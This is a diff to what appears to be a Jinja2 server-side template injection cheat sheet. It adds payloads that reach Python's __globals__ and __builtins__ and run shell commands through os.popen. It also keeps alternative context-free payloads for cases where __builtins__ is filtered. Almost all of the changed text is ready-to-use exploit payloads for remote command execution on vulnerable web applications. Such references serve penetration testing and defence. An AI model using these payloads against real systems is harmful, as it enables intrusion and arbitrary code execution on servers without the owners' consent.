@@ -471,6 +471,12 @@ Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
 {{ ''.__class__.__mro__[2].__subclasses__() }}
 ```
 
+Access `__globals__` and `__builtins__`:
+
+```python
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
 ### Jinja2 - Dump all config variables
 
 ```python
@@ -523,7 +529,11 @@ def hook(*args, **kwargs):
 
 #### Exploit the SSTI by calling os.popen().read()
 
-These payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:
 
 ```python
 {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
